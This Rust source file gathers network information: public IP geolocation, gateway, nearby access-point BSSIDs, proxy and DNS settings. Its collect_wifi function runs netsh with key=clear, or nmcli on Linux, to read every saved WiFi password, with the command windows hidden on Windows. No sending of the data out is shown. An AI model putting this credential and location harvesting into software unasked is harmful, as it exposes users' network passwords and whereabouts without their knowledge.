use std::sync::Mutex;

static GEO_CACHE: Mutex<Option<String>> = Mutex::new(None);

pub struct NetworkInfo;

impl NetworkInfo {
    pub async fn warmup_geo() -> Option<String> {
        {
            let cache = GEO_CACHE.lock().unwrap();
            if let Some(ref cached) = *cache {
                return Some(cached.clone());
            }
        }

        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(5))
            .build()
            .ok()?;

        let resp = client
            .get("https://uapis.cn/api/v1/network/myip")
            .send()
            .await
            .ok()?;

        let text = resp.text().await.ok()?;

        let mut cache = GEO_CACHE.lock().unwrap();
        *cache = Some(text.clone());
        Some(text)
    }

    pub async fn collect() -> String {
        let wan = Self::collect_wan().await;
        let wifi = Self::collect_wifi();
        let nearby_wifi = Self::collect_wifi_bssid();
        let proxy = Self::collect_proxy();
        let dns_suffix = Self::get_dns_suffix();

        format!(
            r#"{{"interfaces":[],"wan":{},"wifi":{},"nearbyWifi":{},"proxy":{},"dnsSuffix":"{}"}}"#,
            wan, wifi, nearby_wifi, proxy, escape(&dns_suffix)
        )
    }

    async fn collect_wan() -> String {
        let gateway = Self::get_default_gateway();

        let cached = GEO_CACHE.lock().unwrap().clone();
        if let Some(ref geo) = cached {
            let ip = extract_str(geo, "ip").unwrap_or("unavailable");
            let region = extract_str(geo, "region").unwrap_or("").trim().to_string();
            let isp = extract_str(geo, "isp").unwrap_or("");
            let asn = extract_str(geo, "asn").unwrap_or("");
            let llc = extract_str(geo, "llc").unwrap_or("");
            let lat = extract_num(geo, "latitude");
            let lng = extract_num(geo, "longitude");

            return format!(
                r#"{{"publicIp":"{}","gateway":"{}","region":"{}","isp":"{}","asn":"{}","llc":"{}","latitude":{},"longitude":{}}}"#,
                escape(ip),
                escape(&gateway.unwrap_or_else(|| "unknown".into())),
                escape(&region),
                escape(isp),
                escape(asn),
                escape(llc),
                lat,
                lng
            );
        }

        format!(
            r#"{{"publicIp":"{}","gateway":"{}","region":"","isp":"","asn":"","llc":"","latitude":0,"longitude":0}}"#,
            escape("unavailable"),
            escape(&gateway.unwrap_or_else(|| "unknown".into()))
        )
    }

    fn get_default_gateway() -> Option<String> {
        #[cfg(target_os = "windows")]
        {
            use std::os::windows::process::CommandExt;
            let output = std::process::Command::new("wmic")
                .args(["path", "Win32_NetworkAdapterConfiguration", "where", "IPEnabled=TRUE", "get", "DefaultIPGateway", "/format:csv"])
                .creation_flags(0x08000000)
                .output()
                .ok()?;
            let text = String::from_utf8_lossy(&output.stdout);
            for line in text.lines().skip(2) {
                let parts: Vec<&str> = line.split(',').collect();
                if parts.len() >= 2 {
                    let gw = parts[1].trim();
                    if !gw.is_empty() && gw != "0.0.0.0" {
                        let first = gw.split(';').next().unwrap_or("").trim();
                        if !first.is_empty() {
                            return Some(first.to_string());
                        }
                    }
                }
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            let output = std::process::Command::new("ip")
                .args(["route", "show", "default"])
                .output()
                .ok()?;
            let text = String::from_utf8_lossy(&output.stdout);
            for line in text.lines() {
                if line.contains("default") {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 3 {
                        return Some(parts[2].to_string());
                    }
                }
            }
        }
        None
    }

    /// Collect saved WiFi profiles with passwords.
    /// Locale-independent: parses by position (value after last `:` on profile lines)
    fn collect_wifi() -> String {
        #[cfg(target_os = "windows")]
        {
            use std::os::windows::process::CommandExt;

            // Step 1: Get profile names
            let profiles_output = std::process::Command::new("netsh")
                .args(["wlan", "show", "profiles"])
                .creation_flags(0x08000000)
                .output()
                .ok()
                .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
                .unwrap_or_default();

            let mut profile_names = Vec::new();
            let mut past_separator = false;
            for line in profiles_output.lines() {
                let trimmed = line.trim();
                if trimmed.contains("---") {
                    past_separator = true;
                    continue;
                }
                if !past_separator { continue; }
                // Profile lines have format: "    <label> : <profile_name>"
                // Extract value after the LAST colon
                if let Some(colon_pos) = trimmed.rfind(':') {
                    let value = trimmed[colon_pos + 1..].trim();
                    if !value.is_empty() {
                        profile_names.push(value.to_string());
                    }
                }
            }

            // Step 2: Get password for each profile
            let mut profiles = Vec::new();
            for name in &profile_names {
                if let Ok(output) = std::process::Command::new("netsh")
                    .args(["wlan", "show", "profile", &format!("name={}", name), "key=clear"])
                    .creation_flags(0x08000000)
                    .output()
                {
                    let detail = String::from_utf8_lossy(&output.stdout);
                    let mut password = String::new();
                    for line in detail.lines() {
                        let t = line.trim();
                        // Match both English "Key Content" and Chinese "密钥内容"
                        // Also match by position: it's the field containing "key" (case-insensitive) or "密钥"
                        let lower = t.to_lowercase();
                        if (lower.contains("key content") || t.contains("密钥内容"))
                            && t.contains(':')
                        {
                            password = t.splitn(2, ':').nth(1).unwrap_or("").trim().to_string();
                            break;
                        }
                    }
                    profiles.push(format!(
                        r#"{{"ssid":"{}","password":"{}"}}"#,
                        escape(name), escape(&password)
                    ));
                }
            }
            return format!("[{}]", profiles.join(","));
        }
        #[cfg(not(target_os = "windows"))]
        {
            // Linux: try nmcli
            let mut profiles = Vec::new();
            if let Ok(output) = std::process::Command::new("nmcli")
                .args(["-t", "-f", "NAME,TYPE", "connection", "show"])
                .output()
            {
                let text = String::from_utf8_lossy(&output.stdout);
                for line in text.lines() {
                    let parts: Vec<&str> = line.split(':').collect();
                    if parts.len() >= 2 && parts[1].contains("wireless") {
                        let ssid = parts[0];
                        let mut password = String::new();
                        if let Ok(detail) = std::process::Command::new("nmcli")
                            .args(["-s", "-t", "-f", "802-11-wireless-security.psk", "connection", "show", ssid])
                            .output()
                        {
                            let pw_text = String::from_utf8_lossy(&detail.stdout);
                            for pw_line in pw_text.lines() {
                                if let Some(val) = pw_line.strip_prefix("802-11-wireless-security.psk:") {
                                    password = val.to_string();
                                }
                            }
                        }
                        profiles.push(format!(
                            r#"{{"ssid":"{}","password":"{}"}}"#,
                            escape(ssid), escape(&password)
                        ));
                    }
                }
            }
            return format!("[{}]", profiles.join(","));
        }
    }

    /// Scan nearby WiFi APs. Uses Win32 Wlan API with netsh regex fallback.
    /// Returns JSON array with ssid, authentication, and band (2.4GHz/5GHz/6GHz).
    fn collect_wifi_bssid() -> String {
        #[cfg(target_os = "windows")]
        {
            let networks = match scan_wifi_wlanapi() {
                Ok(list) => list,
                Err(_) => scan_wifi_netsh().unwrap_or_default(),
            };

            let items: Vec<String> = networks.iter().map(|w| {
                format!(
                    r#"{{"ssid":"{}","auth":"{}","encryption":"{}","bssid":"{}","signal":{},"band":"{}"}}"#,
                    escape(&w.ssid),
                    escape(&w.auth),
                    escape(&w.encryption),
                    escape(&w.bssid),
                    w.signal,
                    escape(&w.band),
                )
            }).collect();

            return format!("[{}]", items.join(","));
        }
        #[cfg(not(target_os = "windows"))]
        {
            // Linux: try nmcli device wifi list
            let mut ap_list: Vec<WifiApInfo> = Vec::new();
            if let Ok(output) = std::process::Command::new("nmcli")
                .args(["-t", "-f", "SSID,BSSID,CHAN,FREQ,SIGNAL,SECURITY", "device", "wifi", "list"])
                .output()
            {
                let text = String::from_utf8_lossy(&output.stdout);
                for line in text.lines() {
                    let parts: Vec<&str> = line.splitn(7, ':').collect();
                    if parts.len() >= 6 {
                        let ssid = parts[0].replace("\\:", ":");
                        if ssid.is_empty() { continue; }
                        let bssid = parts.get(1).map(|s| s.replace("\\:", ":")).unwrap_or_default();
                        let signal: u32 = parts.get(4).unwrap_or(&"0").parse().unwrap_or(0);
                        let security = parts.get(5).unwrap_or(&"");
                        let auth = match *security {
                            "" => "开放",
                            s if s.contains("WPA3") => "WPA3-SAE",
                            s if s.contains("WPA2") => "WPA2-PSK",
                            s if s.contains("WPA") => "WPA-PSK",
                            _ => security,
                        };
                        let encryption = if security.is_empty() { "无" } else { "" };
                        let freq_mhz: u32 = parts.get(3).unwrap_or(&"0").parse().unwrap_or(0);
                        let band = freq_to_band(freq_mhz * 1000).to_string(); // MHz → kHz
                        ap_list.push(WifiApInfo {
                            ssid,
                            auth: auth.to_string(),
                            encryption: encryption.to_string(),
                            bssid,
                            signal,
                            band,
                        });
                    }
                }
            }
            // Fallback: iwlist scan
            if ap_list.is_empty() {
                if let Ok(output) = std::process::Command::new("iwlist")
                    .args(["scan"])
                    .output()
                {
                    let text = String::from_utf8_lossy(&output.stdout);
                    let mut ssid = String::new();
                    let mut bssid = String::new();
                    let mut freq: u32 = 0;
                    let mut signal: u32 = 0;

                    for line in text.lines() {
                        let t = line.trim();
                        if t.starts_with("Cell ") {
                            if !ssid.is_empty() {
                                let band = freq_to_band(freq).to_string();
                                ap_list.push(WifiApInfo {
                                    ssid: ssid.clone(),
                                    auth: String::new(),
                                    encryption: String::new(),
                                    bssid: bssid.clone(),
                                    signal,
                                    band,
                                });
                            }
                            ssid.clear();
                            bssid.clear();
                            freq = 0;
                            signal = 0;
                        } else if t.starts_with("ESSID:") {
                            ssid = t.trim_start_matches("ESSID:").trim_matches('"').to_string();
                        } else if t.starts_with("Address:") {
                            bssid = t.trim_start_matches("Address:").trim().to_string();
                        } else if t.contains("Frequency:") {
                            if let Some(f) = t.split_whitespace().nth(2) {
                                freq = (f.parse::<f64>().unwrap_or(0.0) * 1_000_000.0) as u32; // GHz → kHz
                            }
                        } else if let Some(q) = t.strip_prefix("Quality=") {
                            if let Some(slash) = q.find('/') {
                                let num: u32 = q[..slash].trim().parse().unwrap_or(0);
                                let den: u32 = q[slash+1..].split_whitespace().next().unwrap_or("1").parse().unwrap_or(1);
                                signal = (num * 100 / den).min(100);
                            }
                        }
                    }
                    if !ssid.is_empty() {
                        let band = freq_to_band(freq).to_string();
                        ap_list.push(WifiApInfo {
                            ssid,
                            auth: String::new(),
                            encryption: String::new(),
                            bssid,
                            signal,
                            band,
                        });
                    }
                }
            }
            // Deduplicate by BSSID
            let mut seen = std::collections::HashSet::new();
            ap_list.retain(|w| seen.insert(w.bssid.clone()));

            let items: Vec<String> = ap_list.iter().map(|w| {
                format!(
                    r#"{{"ssid":"{}","auth":"{}","encryption":"{}","bssid":"{}","signal":{},"band":"{}"}}"#,
                    escape(&w.ssid),
                    escape(&w.auth),
                    escape(&w.encryption),
                    escape(&w.bssid),
                    w.signal,
                    escape(&w.band),
                )
            }).collect();

            return format!("[{}]", items.join(","));
        }
    }
}

// ── WiFi Scan Helpers ────────────────────────────────────────────────────

#[derive(Clone)]
struct WifiApInfo {
    ssid: String,
    auth: String,
    encryption: String,
    bssid: String,
    signal: u32,
    band: String,
}

/// Frequency in kHz → band label
fn freq_to_band(freq_khz: u32) -> &'static str {
    if freq_khz == 0 {
        "未知"
    } else if freq_khz < 3_000_000 {
        "2.4GHz"
    } else if freq_khz < 6_000_000 {
        "5GHz"
    } else {
        "6GHz"
    }
}

// ── Win32 Wlan API via raw FFI (Windows, defined at file level) ─────────

#[cfg(target_os = "windows")]
#[allow(non_camel_case_types, non_snake_case)]
mod wlan_ffi {
    pub type HANDLE = *mut std::ffi::c_void;
    pub type DWORD = u32;
    pub type BOOL = i32;
    pub type ULONG = u32;
    pub type ULONGLONG = u64;
    pub type LONG = i32;
    pub type USHORT = u16;
    pub type UCHAR = u8;

    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct GUID {
        pub Data1: u32,
        pub Data2: u16,
        pub Data3: u16,
        pub Data4: [u8; 8],
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct DOT11_SSID {
        pub uSSIDLength: ULONG,
        pub ucSSID: [UCHAR; 32],
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct WLAN_INTERFACE_INFO {
        pub InterfaceGuid: GUID,
        pub strInterfaceDescription: [u16; 256],
        pub isState: u32,
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct WLAN_INTERFACE_INFO_LIST {
        pub dwNumberOfItems: DWORD,
        pub dwIndex: DWORD,
        pub InterfaceInfo: [WLAN_INTERFACE_INFO; 1],
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct WLAN_AVAILABLE_NETWORK {
        pub strProfileName: [u16; 256],
        pub dot11Ssid: DOT11_SSID,
        pub dot11BssType: DWORD,
        pub uNumberOfBssids: DWORD,
        pub bNetworkConnectable: BOOL,
        pub wlanNotConnectableReason: DWORD,
        pub uNumberOfPhyTypes: DWORD,
        pub dot11PhyTypes: [DWORD; 8],
        pub bMorePhyTypes: BOOL,
        pub wlanSignalQuality: DWORD,
        pub bSecurityEnabled: BOOL,
        pub dot11DefaultAuthAlgorithm: DWORD,
        pub dot11DefaultCipherAlgorithm: DWORD,
        pub dwFlags: DWORD,
        pub dwReserved: DWORD,
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct WLAN_AVAILABLE_NETWORK_LIST {
        pub dwNumberOfItems: DWORD,
        pub dwIndex: DWORD,
        pub Network: [WLAN_AVAILABLE_NETWORK; 1],
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct WLAN_BSS_ENTRY {
        pub dot11Ssid: DOT11_SSID,
        pub uPhyId: DWORD,
        pub dot11Bssid: [UCHAR; 6],
        _pad1: u16,
        pub dot11BssType: DWORD,
        pub dot11BssPhyType: DWORD,
        pub lRssi: LONG,
        pub uLinkQuality: DWORD,
        pub bInRegDomain: UCHAR,
        _pad2: UCHAR,
        pub usBeaconPeriod: USHORT,
        _pad3: DWORD,
        pub ullTimestamp: ULONGLONG,
        pub ullHostTimestamp: ULONGLONG,
        pub usCapabilityInformation: USHORT,
        _pad4: USHORT,
        pub ulChCenterFrequency: DWORD,
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct WLAN_BSS_LIST {
        pub dwTotalSize: DWORD,
        pub dwNumberOfItems: DWORD,
        pub wlanBssEntries: [WLAN_BSS_ENTRY; 1],
    }

    extern "system" {
        pub fn WlanOpenHandle(
            dwClientVersion: DWORD,
            pReserved: *const std::ffi::c_void,
            pdwNegotiatedVersion: *mut DWORD,
            phClientHandle: *mut HANDLE,
        ) -> DWORD;

        pub fn WlanCloseHandle(
            hClientHandle: HANDLE,
            pReserved: *const std::ffi::c_void,
        ) -> DWORD;

        pub fn WlanEnumInterfaces(
            hClientHandle: HANDLE,
            pReserved: *const std::ffi::c_void,
            ppInterfaceList: *mut *mut WLAN_INTERFACE_INFO_LIST,
        ) -> DWORD;

        pub fn WlanGetAvailableNetworkList(
            hClientHandle: HANDLE,
            pInterfaceGuid: *const GUID,
            dwFlags: DWORD,
            pReserved: *const std::ffi::c_void,
            ppAvailableNetworkList: *mut *mut WLAN_AVAILABLE_NETWORK_LIST,
        ) -> DWORD;

        pub fn WlanGetNetworkBssList(
            hClientHandle: HANDLE,
            pInterfaceGuid: *const GUID,
            pDot11Ssid: *const DOT11_SSID,
            dot11BssType: DWORD,
            bSecurityEnabled: BOOL,
            pReserved: *const std::ffi::c_void,
            ppWlanBssList: *mut *mut WLAN_BSS_LIST,
        ) -> DWORD;

        pub fn WlanFreeMemory(pMemory: *const std::ffi::c_void);
    }
}

#[cfg(target_os = "windows")]
fn scan_wifi_wlanapi() -> Result<Vec<WifiApInfo>, String> {
    use std::collections::HashMap;
    use wlan_ffi::*;

    const FLAG_ADHOC: DWORD = 1;
    const FLAG_HIDDEN: DWORD = 2;

    unsafe {
        let mut handle: HANDLE = std::ptr::null_mut();
        let mut version = 0u32;

        if WlanOpenHandle(2, std::ptr::null(), &mut version, &mut handle) != 0 {
            return Err("WlanOpenHandle failed".into());
        }

        let mut if_list_ptr: *mut WLAN_INTERFACE_INFO_LIST = std::ptr::null_mut();
        if WlanEnumInterfaces(handle, std::ptr::null(), &mut if_list_ptr) != 0 {
            WlanCloseHandle(handle, std::ptr::null());
            return Err("WlanEnumInterfaces failed".into());
        }

        let mut result_map: HashMap<String, WifiApInfo> = HashMap::new();
        let if_count = (*if_list_ptr).dwNumberOfItems as usize;

        for i in 0..if_count {
            let if_info = &*((*if_list_ptr).InterfaceInfo.as_ptr().add(i));
            let guid_ptr = &if_info.InterfaceGuid as *const GUID;

            // First pass: collect auth + encryption per SSID from available network list
            let mut sec_map: HashMap<String, (String, String)> = HashMap::new();
            let mut net_list_ptr: *mut WLAN_AVAILABLE_NETWORK_LIST = std::ptr::null_mut();
            let flags = FLAG_ADHOC | FLAG_HIDDEN;
            if WlanGetAvailableNetworkList(handle, guid_ptr, flags, std::ptr::null(), &mut net_list_ptr) == 0
                && !net_list_ptr.is_null()
            {
                let net_count = (*net_list_ptr).dwNumberOfItems as usize;
                for j in 0..net_count {
                    let net = &*((*net_list_ptr).Network.as_ptr().add(j));
                    let ssid_len = net.dot11Ssid.uSSIDLength as usize;
                    if ssid_len == 0 { continue; }
                    let ssid_bytes = &net.dot11Ssid.ucSSID[..ssid_len];
                    let ssid = String::from_utf8_lossy(ssid_bytes).to_string();
                    if ssid.is_empty() { continue; }
                    let auth = auth_algo_label(net.dot11DefaultAuthAlgorithm);
                    let enc = cipher_algo_label(net.dot11DefaultCipherAlgorithm);
                    sec_map.entry(ssid).or_insert((auth, enc));
                }
                WlanFreeMemory(net_list_ptr as *const _);
            }

            // Second pass: collect BSS entries with BSSID, signal, band
            let mut bss_list_ptr: *mut WLAN_BSS_LIST = std::ptr::null_mut();
            if WlanGetNetworkBssList(
                handle, guid_ptr, std::ptr::null(),
                1, 0, std::ptr::null(), &mut bss_list_ptr,
            ) == 0 && !bss_list_ptr.is_null()
            {
                let bss_count = (*bss_list_ptr).dwNumberOfItems as usize;
                for j in 0..bss_count {
                    let bss = &*((*bss_list_ptr).wlanBssEntries.as_ptr().add(j));
                    let ssid_bytes = &bss.dot11Ssid.ucSSID[..bss.dot11Ssid.uSSIDLength as usize];
                    let ssid = String::from_utf8_lossy(ssid_bytes).to_string();
                    if ssid.is_empty() { continue; }

                    let bssid = format!(
                        "{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
                        bss.dot11Bssid[0], bss.dot11Bssid[1], bss.dot11Bssid[2],
                        bss.dot11Bssid[3], bss.dot11Bssid[4], bss.dot11Bssid[5],
                    );
                    let band = freq_to_band(bss.ulChCenterFrequency).to_string();
                    let signal = bss.uLinkQuality;

                    let (auth, encryption) = sec_map
                        .get(&ssid)
                        .map(|(a, e)| (a.clone(), e.clone()))
                        .unwrap_or_default();

                    // Key by BSSID (unique per AP radio)
                    result_map.entry(bssid.clone()).or_insert(WifiApInfo {
                        ssid,
                        auth,
                        encryption,
                        bssid,
                        signal,
                        band,
                    });
                }
                WlanFreeMemory(bss_list_ptr as *const _);
            }
        }

        WlanFreeMemory(if_list_ptr as *const _);
        WlanCloseHandle(handle, std::ptr::null());

        let mut result: Vec<WifiApInfo> = result_map.into_values().collect();
        result.sort_by(|a, b| a.ssid.to_lowercase().cmp(&b.ssid.to_lowercase()));
        Ok(result)
    }
}

#[cfg(target_os = "windows")]
fn auth_algo_label(algo: u32) -> String {
    match algo {
        1 => "开放".into(),
        2 => "共享密钥".into(),
        3 => "WPA".into(),
        4 => "WPA-PSK".into(),
        5 => "WPA2".into(),
        6 => "WPA2-PSK".into(),
        7 => "WPA3".into(),
        8 => "WPA3-SAE".into(),
        9 => "OWE".into(),
        v => format!("未知({})", v),
    }
}

#[cfg(target_os = "windows")]
fn cipher_algo_label(algo: u32) -> String {
    match algo {
        0 => "无".into(),
        1 => "WEP40".into(),
        2 => "TKIP".into(),
        3 => "AES".into(),
        4 => "WEP104".into(),
        7 => "WEP".into(),
        8 => "GCMP".into(),
        9 => "GCMP-256".into(),
        10 => "CCMP-256".into(),
        v => format!("未知({})", v),
    }
}

// ── netsh fallback (Windows) ────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn scan_wifi_netsh() -> Result<Vec<WifiApInfo>, String> {
    use std::os::windows::process::CommandExt;

    let output = std::process::Command::new("netsh")
        .args(["wlan", "show", "networks", "mode=bssid"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("执行 netsh 失败: {}", e))?;

    if !output.status.success() {
        return Err("netsh 命令执行失败".into());
    }

    let text = String::from_utf8_lossy(&output.stdout).to_string();
    parse_netsh_output(&text)
}

#[cfg(target_os = "windows")]
fn parse_netsh_output(text: &str) -> Result<Vec<WifiApInfo>, String> {
    let ssid_re = regex::Regex::new(r"SSID \d+\s*:\s*(.+)").unwrap();
    let auth_re = regex::Regex::new(r"(?:身份验证|Authentication)\s*:\s*(.+)").unwrap();
    let channel_re = regex::Regex::new(r"(?:频道|Channel)\s*:\s*(\d+)").unwrap();

    let mut networks = Vec::new();
    let mut current_ssid: Option<String> = None;
    let mut current_auth: Option<String> = None;
    let mut bands = std::collections::HashSet::new();

    for line in text.lines() {
        if let Some(cap) = ssid_re.captures(line) {
            // Save previous SSID block
            if let Some(ssid) = current_ssid.take() {
                let band = if bands.is_empty() {
                    "未知".to_string()
                } else {
                    let mut v: Vec<&str> = bands.iter().map(|s| *s).collect();
                    v.sort();
                    v.join("/")
                };
                networks.push(WifiApInfo {
                    ssid,
                    auth: current_auth.take().unwrap_or_else(|| "未知".into()),
                    encryption: String::new(),
                    bssid: String::new(),
                    signal: 0,
                    band,
                });
            }
            current_ssid = Some(cap[1].trim().to_string());
            current_auth = None;
            bands.clear();
        } else if let Some(cap) = auth_re.captures(line) {
            current_auth = Some(cap[1].trim().to_string());
        } else if let Some(cap) = channel_re.captures(line) {
            if let Ok(ch) = cap[1].parse::<u32>() {
                bands.insert(channel_to_band(ch));
            }
        }
    }

    // Last SSID
    if let Some(ssid) = current_ssid {
        let band = if bands.is_empty() {
            "未知".to_string()
        } else {
            let mut v: Vec<&str> = bands.iter().map(|s| *s).collect();
            v.sort();
            v.join("/")
        };
        networks.push(WifiApInfo {
            ssid,
            auth: current_auth.unwrap_or_else(|| "未知".into()),
            encryption: String::new(),
            bssid: String::new(),
            signal: 0,
            band,
        });
    }

    // Deduplicate by SSID
    let mut seen = std::collections::HashSet::new();
    networks.retain(|n| seen.insert(n.ssid.clone()));

    Ok(networks)
}

fn channel_to_band(channel: u32) -> &'static str {
    match channel {
        1..=14 => "2.4GHz",
        36..=196 => "5GHz",
        1..=233 => "6GHz",
        _ => "未知",
    }
}

impl NetworkInfo {
    fn collect_proxy() -> String {
        #[cfg(target_os = "windows")]
        {
            use std::os::windows::process::CommandExt;
            if let Ok(output) = std::process::Command::new("reg")
                .args(["query", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"])
                .creation_flags(0x08000000)
                .output()
            {
                let text = String::from_utf8_lossy(&output.stdout).to_uppercase();
                let enabled = text.contains("PROXYENABLE") && text.contains("0X1");
                let server = {
                    let search = "PROXYSERVER";
                    if let Some(pos) = text.find(search) {
                        let rest = &text[pos + search.len()..];
                        if let Some(reg_pos) = rest.find("REG_SZ") {
                            rest[reg_pos + 6..].lines().next().unwrap_or("").trim().to_string()
                        } else {
                            String::new()
                        }
                    } else {
                        String::new()
                    }
                };

                let port: u16 = if let Some(colon) = server.rfind(':') {
                    server[colon + 1..].parse().unwrap_or(0)
                } else { 0 };

                return format!(
                    r#"{{"enabled":{},"server":"{}","port":{},"bypass":""}}"#,
                    enabled, escape(&server), port
                );
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            let http_proxy = std::env::var("HTTP_PROXY")
                .or_else(|_| std::env::var("http_proxy"))
                .unwrap_or_default();
            let https_proxy = std::env::var("HTTPS_PROXY")
                .or_else(|_| std::env::var("https_proxy"))
                .unwrap_or_default();
            let all_proxy = if !https_proxy.is_empty() { &https_proxy } else { &http_proxy };
            let enabled = !all_proxy.is_empty();

            return format!(
                r#"{{"enabled":{},"server":"{}","port":0,"bypass":""}}"#,
                enabled, escape(all_proxy)
            );
        }
        #[allow(unreachable_code)]
        r#"{"enabled":false,"server":"","port":0,"bypass":""}"#.to_string()
    }

    fn get_dns_suffix() -> String {
        #[cfg(target_os = "windows")]
        {
            use std::os::windows::process::CommandExt;
            if let Ok(output) = std::process::Command::new("ipconfig")
                .args(["/all"])
                .creation_flags(0x08000000)
                .output()
            {
                let text = String::from_utf8_lossy(&output.stdout);
                for line in text.lines() {
                    // Match both "DNS Suffix" (EN) and "DNS 后缀" (CN)
                    let lower = line.to_lowercase();
                    if (lower.contains("dns suffix") || lower.contains("dns 后缀"))
                        && line.contains(':')
                    {
                        return line.split(':').nth(1).unwrap_or("").trim().to_string();
                    }
                }
            }
        }
        String::new()
    }
}

fn extract_str<'a>(json: &'a str, key: &str) -> Option<&'a str> {
    let search = format!("\"{}\":\"", key);
    let start = json.find(&search)?;
    let start = start + search.len();
    let end = json[start..].find('"')?;
    Some(&json[start..start + end])
}

fn extract_num(json: &str, key: &str) -> String {
    let search = format!("\"{}\":", key);
    let start = match json.find(&search) {
        Some(s) => s + search.len(),
        None => return "0".into(),
    };
    let rest = &json[start..];
    let end = rest.find(|c: char| !c.is_ascii_digit() && c != '.' && c != '-').unwrap_or(rest.len());
    if end > 0 { rest[..end].to_string() } else { "0".into() }
}

fn extract_after_colon(s: &str) -> Option<&str> {
    s.find(':').map(|i| s[i + 1..].trim())
}

fn escape(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
}
